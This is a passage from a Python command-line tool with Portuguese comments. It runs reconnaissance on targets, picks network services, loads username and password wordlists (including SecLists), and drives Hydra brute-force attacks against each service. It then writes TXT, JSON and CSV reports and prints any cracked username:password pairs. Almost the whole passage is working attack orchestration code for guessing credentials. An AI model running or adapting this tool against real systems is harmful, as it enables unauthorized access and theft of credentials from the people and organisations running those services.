                aggressive=args.aggressive_scan,
            )
            report.set_recon(target, recon)
            if args.recon_only:
                continue

        # ── Determinar serviços ──
        if args.all_services:
            svcs = list(SERVICES.keys())
        elif args.services:
            svcs = [
                s.strip() for s in args.services.split(",")
                if s.strip() in SERVICES
            ]
            invalid = [
                s.strip() for s in args.services.split(",")
                if s.strip() not in SERVICES and s.strip()
            ]
            if invalid:
                log("warn", f"Ignorados: {', '.join(invalid)}")
        else:
            svcs = auto_detect_services(recon)

        if not svcs:
            log("warn", "Nenhum serviço para atacar. Pulando...")
            continue

        report.services_tested = list(set(report.services_tested + svcs))

        # ── ATAQUES ──
        print(f"\n  {C.RED}{C.BOLD}── FORÇA BRUTA ──{C.RESET}")
        print(f"  {C.DIM}Serviços: {', '.join(svcs)}{C.RESET}\n")

        for svc_key in svcs:
            svc = SERVICES[svc_key]
            print(
                f"\n  {C.BOLD}──── {svc.name} "
                f"(porta {svc.port}) ────{C.RESET}\n"
            )

            userlist = get_wordlist(
                args.userlist, svc.default_users,
                f"users_{svc_key}", wl_dir,
                use_seclists=use_sl,
                seclists_candidates=SECLISTS_USERS,
            )
            passlist = get_wordlist(
                args.passlist, svc.default_passes,
                f"pass_{svc_key}", wl_dir,
                use_seclists=use_sl,
                seclists_candidates=SECLISTS_PASSES,
            )

            if args.http_form and "http" in svc_key and "form" in svc_key:
                svc.extra_args = [args.http_form]

            findings = run_hydra(
                target=target,
                service_key=svc_key,
                userlist=userlist,
                passlist=passlist,
                threads=args.threads,
                port=args.port,
                verbose=args.verbose,
                timeout=args.timeout,
                output_dir=args.output,
                exit_on_first=not args.continue_on_found,
            )
            report.add_findings(findings)

    # ════════════════════════════════════════════════════════════════
    # RELATÓRIOS
    # ════════════════════════════════════════════════════════════════

    print(f"\n{'━' * 65}")
    print(f"  {C.CYAN}{C.BOLD}── RELATÓRIOS ──{C.RESET}\n")

    txt_path = report.generate_txt()
    json_path = report.generate_json()
    csv_path = report.generate_csv()

    log("ok", f"TXT : {C.BOLD}{txt_path}{C.RESET}")
    log("ok", f"JSON: {C.BOLD}{json_path}{C.RESET}")
    log("ok", f"CSV : {C.BOLD}{csv_path}{C.RESET}")

    # ── Sumário ──
    print(f"\n  {C.BOLD}{'═' * 60}{C.RESET}")
    print(f"  {C.BOLD}  SUMÁRIO FINAL{C.RESET}")
    print(f"  {C.BOLD}{'═' * 60}{C.RESET}")
    print(f"  Alvos             : {len(targets)}")
    print(f"  Serviços testados : {len(report.services_tested)}")
    print(
        f"  Credenciais       : "
        f"{C.GREEN}{C.BOLD}{len(report.findings)}{C.RESET}"
    )

    if report.findings:
        print(f"\n  {C.GREEN}{C.BOLD}  🔑 Credenciais Encontradas:{C.RESET}")
        print(f"  {'─' * 56}")
        for f in report.findings:
            print(
                f"  {C.GREEN}►{C.RESET} {f.host}:{f.port} "
                f"{f.service:<14} "
                f"{C.BOLD}{f.username}{C.RESET}:{C.RED}{f.password}{C.RESET}"
            )
    else:
        print(f"\n  {C.YELLOW}Nenhuma credencial fraca encontrada.{C.RESET}")

    print(f"  {'═' * 60}\n")


if __name__ == "__main__":
    main()
